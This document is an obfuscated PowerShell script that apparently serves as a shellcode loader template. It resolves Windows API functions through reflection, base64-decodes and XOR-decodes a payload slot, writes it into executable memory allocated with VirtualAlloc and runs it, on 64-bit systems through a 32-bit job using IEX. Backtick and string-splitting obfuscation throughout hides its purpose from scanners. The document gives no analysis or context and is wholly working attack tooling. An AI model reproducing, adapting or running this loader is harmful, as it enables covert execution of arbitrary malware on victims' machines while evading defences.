set-`S`TRIctm`ODe -Version 2

${D`oIT} = @'

function f`U`Nc_ge`T`_`ProC_ADdR`ESS {
	Param (${V`AR_ModU`Le}, ${VAr_`Pr`OC`EduRE})		
	${V`Ar`_unS`AFE_NAti`V`e_`mEtHOds} = ([AppDomain]::"Cu`RrEnTd`om`A`In".("{2}{3}{1}{0}"-f'lies','ssemb','Ge','tA').Invoke() | whe`R`e-obJecT { ${_}."g`LOb`ALASsEmblYca`c`HE" -And ${_}."Lo`CAT`ION".("{1}{0}"-f 't','Spli').Invoke('\\')[-1].("{0}{1}"-f 'Eq','uals').Invoke(("{3}{2}{0}{1}"-f 'l','l','tem.d','Sys')) }).("{0}{1}{2}" -f 'G','etTy','pe').Invoke(("{3}{4}{2}{1}{0}{5}" -f 'M','ve','n32.UnsafeNati','M','icrosoft.Wi','ethods'))
	${Var`_G`pA} = ${V`Ar_uNs`AfE_N`A`TivE`_Me`THO`DS}.("{2}{1}{0}"-f 'od','etMeth','G').Invoke(("{3}{0}{1}{2}" -f'A','ddr','ess','GetProc'), [Type[]] @(("{4}{6}{3}{5}{2}{1}{0}" -f'f','.HandleRe','es','ropServ','System.','ic','Runtime.Inte'), ("{2}{1}{0}" -f'ring','t','s')))
	return ${VA`R_`gpa}."in`VoKe"(${n`UlL}, @([System.Runtime.InteropServices.HandleRef](N`e`w-obJeCT ('System.'+'Run'+'time'+'.Int'+'eropSe'+'rv'+'ice'+'s.Ha'+'ndleR'+'e'+'f')((nEW`-`ob`JEcT ('I'+'ntPtr')), (${V`Ar_uNs`AfE`_NAti`VE_mETHoDS}.("{2}{1}{0}" -f'thod','tMe','Ge').Invoke(("{4}{2}{3}{1}{0}"-f 'le','Hand','tModu','le','Ge')))."INvO`Ke"(${N`Ull}, @(${VaR_m`o`duLe})))), ${V`Ar_`PR`OceDURE}))
}

function fu`Nc_geT_dELeG`A`T`e_T`yPe {
	Param (
		[Parameter(POsiTIoN = 0, mANdatORY = ${T`RUE})] [Type[]] ${vaR`_pA`RametERs},
		[Parameter(pOsitIOn = 1)] [Type] ${VAR`_r`etUrN_tyPe} = [Void]
	)

	${VAR`_TypE_bU`I`lDER} = [AppDomain]::"CUrRE`NT`dOmA`iN".("{0}{3}{1}{4}{2}" -f 'DefineD','cAss','ly','ynami','emb').Invoke((new-`O`B`Ject ('Sys'+'tem.Re'+'f'+'lection.'+'Ass'+'em'+'b'+'lyNam'+'e')(("{3}{2}{1}{0}{5}{4}"-f'eg','dDel','te','Reflec','e','at'))), [System.Reflection.Emit.AssemblyBuilderAccess]::"r`Un").("{1}{0}{3}{2}"-f 'ynamic','DefineD','le','Modu').Invoke(("{0}{1}{2}" -f 'In','Memor','yModule'), ${f`AlsE}).("{2}{1}{0}" -f 'ineType','f','De').Invoke(("{2}{0}{1}{3}" -f 'teT','y','MyDelega','pe'), ("{4}{5}{0}{3}{7}{6}{9}{8}{1}{2}" -f 'Public, Sea','Au','toClass','led,','C','lass, ','nsiClas',' A',', ','s'), [System.MulticastDelegate])
	${VaR_t`y`p`E_b`Ui`lDEr}.("{1}{3}{2}{0}"-f 'r','DefineCo','ucto','nstr').Invoke(("{0}{4}{3}{6}{7}{5}{1}{2}" -f 'RTSpec','ub','lic','Name, H','ial','Sig, P','i','deBy'), [System.Reflection.CallingConventions]::"St`AN`daRD", ${v`A`R_paraM`E`TeRs}).("{1}{4}{3}{0}{5}{2}" -f'men','Set','ionFlags','e','Impl','tat').Invoke(("{1}{3}{2}{0}"-f' Managed','Run','ime,','t'))
	${var_`TyPE`_`Bu`iLdER}.("{0}{3}{1}{2}" -f'De','i','neMethod','f').Invoke('Invoke', ("{2}{0}{5}{3}{6}{4}{7}{1}{8}"-f'c, Hid','a','Publi','ySig, NewS','ot, V','eB','l','irtu','l'), ${var_r`e`TURN`_`TYpE}, ${Var_PA`R`A`MEterS}).("{2}{0}{5}{3}{1}{4}" -f'etImp','ion','S','t','Flags','lementa').Invoke(("{1}{0}{4}{2}{3}"-f 'untime','R','n','aged',', Ma'))

	return ${Va`R`_T`yPE_BuiLD`er}.("{2}{1}{3}{0}"-f'pe','at','Cre','eTy').Invoke()
}

[Byte[]]${va`R_`CO`De} = [System.Convert]::("{0}{4}{2}{5}{1}{3}"-f'From','r','se64S','ing','Ba','t').Invoke(('%%DATA%%'))

for (${x} = 0; ${x} -lt ${VaR_Co`dE}."C`ouNT"; ${x}++) {
	${vA`R_`cOdE}[${x}] = ${vA`R_C`oDE}[${x}] -bxor 42
}

${va`R_`VA} = [System.Runtime.InteropServices.Marshal]::("{5}{2}{7}{0}{4}{1}{6}{3}"-f 'F','i','g','er','orFunct','GetDele','onPoint','ate').Invoke((f`UNc_`g`et_pROc_`AdDR`EsS ('ke'+'rne'+'l32.dll') ('Virtu'+'a'+'lAllo'+'c')), (Func`_GEt`_d`EL`EgATe_tYpe @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
${Va`R`_BufFER} = ${VaR_`Va}."iNV`OKE"([IntPtr]::"z`eRO", ${Var`_c`OdE}."L`EnGth", 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::("{1}{0}" -f 'opy','C').Invoke(${v`Ar_`CODe}, 0, ${vaR_bu`F`FER}, ${VA`R_`C`oDE}."l`enGTh")

${VAR`_`RUnme} = [System.Runtime.InteropServices.Marshal]::"G`eTdEleG`At`e`ForFUnCTIO`NpoiN`TeR"(${Var_`BuF`Fer}, (FUnC_gEt_d`E`lEGaTE`_TY`pe @([IntPtr]) ([Void])))
${vAR`_RU`Nme}."iN`Voke"([IntPtr]::"zE`Ro")

'@

If ([IntPtr]::"s`Ize" -eq 8) {
	ST`ArT-joB { param(${a}) I`ex ${a} } -RunAs32 -Argument ${DO`it} | WAiT-`Job | RecEI`V`e-JOB
}
else {
	I`EX ${d`OiT}
}

